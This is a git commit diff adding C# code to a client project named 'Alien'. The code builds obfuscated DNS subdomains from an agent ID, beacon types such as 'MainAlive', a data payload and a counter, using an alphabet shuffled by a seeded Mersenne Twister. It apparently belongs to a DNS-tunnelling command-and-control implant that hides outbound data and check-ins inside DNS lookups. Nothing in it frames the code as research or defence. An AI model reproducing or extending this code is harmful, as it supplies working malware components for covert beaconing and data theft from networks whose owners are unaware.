1683957719cd921a6bdb3edbb36f1fdced52583a
Kop <rolage@yandex.ru>
2022-12-05 20:15:10 +0300

    added domain maker with mersenne twister

--- client/client/DnsClass.cs
+++ client/client/DnsClass.cs
@@ -6,6 +6,28 @@ namespace Alien
 {
 	internal class DnsClass
 	{
+		private static void _DomainMaker(Enums.DomainType domainType, string data)
+		{
+			if (DnsClass._Try == 0)
+			{
+				if (domainType == Enums.DomainType.MainAlive)
+				{
+					DnsClass._Domain = Util.ConvertIntToDomain(Config.GetAgentID().Value);
+				}
+				else if (domainType == Enums.DomainType.FirstAlive)
+				{
+					DnsClass._Domain = Util.ConvertIntToDomain((int)domainType) + data;
+				}
+				else
+				{
+					DnsClass._Domain = Util.ConvertIntToDomain((int)domainType) + Util.ConvertIntToDomain(Config.GetAgentID().Value) + data;
+				}
+				string shuffle = Util.Shuffle(Config.GetCounter());
+				DnsClass._Domain = Util.MapBaseSubdomainCharacters(DnsClass._Domain, shuffle) + Util.ConvertIntToCounter(Config.GetCounter()).PadLeft(3, Config.CharsCounter[0]) + "." + Config.GetDomain();
+			}
+		}
+
+
 		public static void ReadySend(byte[] sendData)
 		{
 			DnsClass._SendByteIndex = 0;
--- client/client/Util.cs
+++ client/client/Util.cs
@@ -6,6 +6,30 @@ namespace Alien
 {
 	internal class Util
 	{
+		public static string Shuffle(int seed)
+		{
+			string text = Config.CharsDomain;
+			int length = text.Length;
+			string text2 = string.Empty;
+			RandomMersenneTwister randomMersenneTwister = new RandomMersenneTwister((uint)seed);
+			for (int i = 0; i < length; i++)
+			{
+				int randomRange = randomMersenneTwister.GetRandomRange(0, text.Length);
+				text2 += text[randomRange].ToString();
+				text = text.Remove(randomRange, 1);
+			}
+			return text2;
+		}
+
+		public static string MapBaseSubdomainCharacters(string data, string shuffle)
+		{
+			string text = string.Empty;
+			for (int i = 0; i < data.Length; i++)
+			{
+				text += shuffle[Config.CharsDomain.IndexOf(data[i])].ToString();
+			}
+			return text;
+		}
 		public static void Log(string log)
 		{
 			Console.Write(
@@ -23,6 +47,29 @@ namespace Alien
 		public static void MakeDelay(int seconds)
 		{
 			Thread.Sleep(seconds);
+		}
+
+		public static string ConvertIntToDomain(int value)
+		{
+			return Util._IntToString(value, Config.CharsDomain);
+		}
+
+		public static string ConvertIntToCounter(int value)
+		{
+			return Util._IntToString(value, Config.CharsCounter);
+		}
+
+		private static string _IntToString(int value, string baseString)
+		{
+			string text = string.Empty;
+			int length = baseString.Length;
+			do
+			{
+				text = baseString[value % length].ToString() + text;
+				value /= length;
+			}
+			while (value > 0);
+			return text;
 		}
 	}
 }
